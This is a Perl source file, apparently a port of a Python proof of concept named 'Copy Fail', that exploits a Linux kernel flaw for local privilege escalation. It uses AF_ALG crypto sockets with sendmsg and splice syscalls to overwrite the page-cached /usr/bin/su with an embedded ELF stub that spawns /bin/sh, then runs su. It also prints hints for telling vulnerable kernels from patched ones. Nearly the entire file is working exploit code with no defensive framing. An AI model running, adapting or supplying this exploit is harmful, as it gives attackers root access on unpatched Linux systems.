#!/usr/bin/perl
#
# Perl translation of cp.py for Red Hat's stock Perl (x86_64).
# Manipulates /usr/bin/su using Linux AF_ALG + splice/sendmsg page-cache primitive.
# No non-core modules; uses syscall for sendmsg and splice.
#

use strict;
use warnings;

# Linux constants (match the Python PoC exactly, including ALG_SET_KEY=3)
my $AF_ALG                 = 38;
my $SOCK_SEQPACKET         = 5;
my $ALG_SET_KEY            = 3;
my $ALG_SET_AEAD_ASSOCLEN  = 4;
my $ALG_SET_AEAD_AUTHSIZE  = 5;
my $SOL_ALG                = 279;

my $MSG_MORE               = 0x8000;

# Syscall numbers for x86_64 (stock RHEL kernels)
my $SYS_socket     = 41;
my $SYS_bind       = 49;
my $SYS_accept     = 43;
my $SYS_setsockopt = 54;
my $SYS_sendmsg    = 46;
my $SYS_splice     = 275;

# Replicate the exact ancillary / setsockopt data from the Python version
my $KEY_DATA       = pack('H*', '0800010000000010' . '0' x 64);
my $ASSOC_LEN_DATA = "\x08\0\0\0";
my $AUTH_SIZE_4    = "\x10\0\0\0";                 # 4 bytes (used for initial setsockopt with implied len=4)
my $ZERO4          = "\0\0\0\0";

sub sockaddr_alg {
    my ($type, $name) = @_;
    # struct sockaddr_alg { u16 family; u8 type[14]; u32 feat; u32 mask; u8 name[64]; }
    pack('S a14 L L a64', $AF_ALG, $type, 0, 0, $name);
}

sub add_cmsg {
    my ($cbuf_ref, $level, $type, $data) = @_;
    my $dlen   = length($data);
    my $clen   = 16 + $dlen;                     # cmsg_len = sizeof(cmsghdr) + dlen
    my $entry  = pack('Q I I', $clen, $level, $type) . $data;
    my $cspace = 16 + ((($dlen + 7) >> 3) << 3); # CMSG_SPACE
    $entry .= "\0" x ($cspace - length($entry));
    ${$cbuf_ref} .= $entry;
}

sub send_data_over_crypto_socket {
    my ($source_fd, $offset, $payload_chunk) = @_;

    # Create and bind AF_ALG crypto socket (exact same parameters as Python)
    socket(my $crypto, $AF_ALG, $SOCK_SEQPACKET, 0)
        or do { warn "socket(AF_ALG) failed: $!"; return 0; };

    my $addr = sockaddr_alg("aead", "authencesn(hmac(sha256),cbc(aes))");
    bind($crypto, $addr)
        or do { warn "bind failed: $!"; close($crypto); return 0; };

    # Initial configuration (note: ALG_SET_KEY uses value 3 per the original PoC)
    setsockopt($crypto, $SOL_ALG, $ALG_SET_KEY, $KEY_DATA)
        or warn "setsockopt(KEY) warning: $!";
    setsockopt($crypto, $SOL_ALG, $ALG_SET_AEAD_AUTHSIZE, $AUTH_SIZE_4)
        or warn "setsockopt(AUTHSIZE) warning: $!";
    setsockopt($crypto, $SOL_ALG, $ALG_SET_AEAD_ASSOCLEN, $ASSOC_LEN_DATA)
        or warn "setsockopt(ASSOCLEN) warning: $!";

    # Accept operation socket.
    # NOTE: On patched kernels (or when the AEAD setup is rejected), this commonly fails
    # with "Software caused connection abort" (ECONNABORTED). We no longer die here so the
    # script can continue and you can see whether any rounds succeed.
    my $client;
    unless (accept($client, $crypto)) {
        my $err = $!;
        my $errno = 0 + $!;
        warn sprintf("accept failed at offset %d: %s (errno %d)", $offset, $err, $errno);
        close($crypto);
        return 0;
    }

    my $client_fd = fileno($client);

    # --- sendmsg with data + 3 ancillary ALG items + MSG_MORE ---
    my $data = ("A" x 4) . $payload_chunk;

    # Build iovec (one element)
    my $iov = pack('P', $data) . pack('Q', length($data));

    # Build control buffer (3 cmsghdrs) using the *exact* data values from Python ancillary_data
    my $control = '';
    add_cmsg(\$control, $SOL_ALG, $ALG_SET_AEAD_ASSOCLEN, $ZERO4);
    add_cmsg(\$control, $SOL_ALG, $ALG_SET_AEAD_AUTHSIZE, "\x10" . ("\0" x 19));
    add_cmsg(\$control, $SOL_ALG, $ALG_SET_KEY, "\x08\0\0\0");

    # Build msghdr (x86_64 layout, 56 bytes)
    my $msghdr =
        pack('Q', 0) . pack('L', 0) . "\0"x4 .   # msg_name + namelen + pad
        pack('Q', 0) . pack('Q', 1) .           # msg_iov + iovlen
        pack('Q', 0) . pack('Q', 0) .           # msg_control + controllen (placeholders)
        pack('L', 0) . "\0"x4;                  # msg_flags + pad

    # Poke in the live pointers (pack('P', ...) gives the native pointer bytes to the scalar's buffer)
    substr($msghdr, 16, 8, pack('P', $iov));
    substr($msghdr, 32, 8, pack('P', $control));
    substr($msghdr, 40, 8, pack('Q', length($control)));

    # The syscall sendmsg(fd, &msghdr, flags). We pass $msghdr directly so Perl hands &its_buffer.
    syscall($SYS_sendmsg, $client_fd, $msghdr, $MSG_MORE);

    # --- splice dance (exact equivalent of the two os.splice calls) ---
    my $total = $offset + 4;

    pipe(my $pr, my $pw);
    my $prd = fileno($pr);
    my $pwd = fileno($pw);

    # splice(source_fd, off_in=&offset, pipe_write, NULL, total, 0)
    my $off_in = pack('q', $offset);
    syscall($SYS_splice, $source_fd, $off_in, $pwd, 0, $total, 0);

    # splice(pipe_read, NULL, client_fd, NULL, total, 0)
    syscall($SYS_splice, $prd, 0, $client_fd, 0, $total, 0);

    # Best-effort recv (result ignored, matches Python try/except pass)
    my $rbuf;
    eval { recv($client, $rbuf, 8 + $offset, 0); };

    # Close everything for this round (finalizes the AF_ALG operation)
    close($client);
    close($crypto);
    close($pr);
    close($pw);

    return 1;   # Success: we got the operation socket and executed sendmsg + splices
}

# Make sure early returns from the sub are falsy
# (the "return;" statements above already return undef, which is false)

sub main {
    print "Copy Fail PoC (Perl port) starting. Target: /usr/bin/su\n";
    print "Kernel: ", `uname -r 2>/dev/null` || "unknown", "\n";
    print "Note: 'accept: Software caused connection abort' (ECONNABORTED) on many/all rounds\n";
    print "      usually means the kernel rejected the AEAD setup (i.e. likely patched or not vulnerable).\n";
    print "      On a vulnerable kernel, accept should succeed for most rounds.\n\n";

    # Open target read-only (we only ever pass the fd to splice)
    open(my $sufh, '<', '/usr/bin/su') or die "open(/usr/bin/su): $!";
    my $su_fd = fileno($sufh);

    # Embedded decompressed payload (ELF stub that does execve("/bin/sh"))
    my $payload_hex =
        '7f454c4602010100000000000000000002003e00010000007800400000000000400000000000000000000000000000000000000040003800010000000000000001000000050000000000000000000000000040000000000000004000000000009e000000000000009e00000000000000001000000000000031c031ffb0690f05488d3d0f00000031f66a3b58990f0531ff6a3c580f052f62696e2f7368000000';
    my $payload = pack('H*', $payload_hex);

    my $off = 0;
    my $len = length($payload);
    my $success_rounds = 0;
    while ($off < $len) {
        my $chunk = substr($payload, $off, 4);
        if (send_data_over_crypto_socket($su_fd, $off, $chunk)) {
            $success_rounds++;
        }
        $off += 4;
    }

    print "\nAll 40 rounds attempted. Rounds that got past accept (primitive attempted): $success_rounds / 40\n";
    print "Check the warnings above for details on failures.\n";
    print "Few or no 'accept failed' messages + the script reaching 'system su' usually indicates a vulnerable kernel.\n";
    print "Many 'accept failed' messages (especially ECONNABORTED) = kernel is rejecting the primitive (patched or not vulnerable).\n\n";

    # Execute the (now page-cache-modified) su
    print "Attempting su...\n";
    system('su');
}

main();
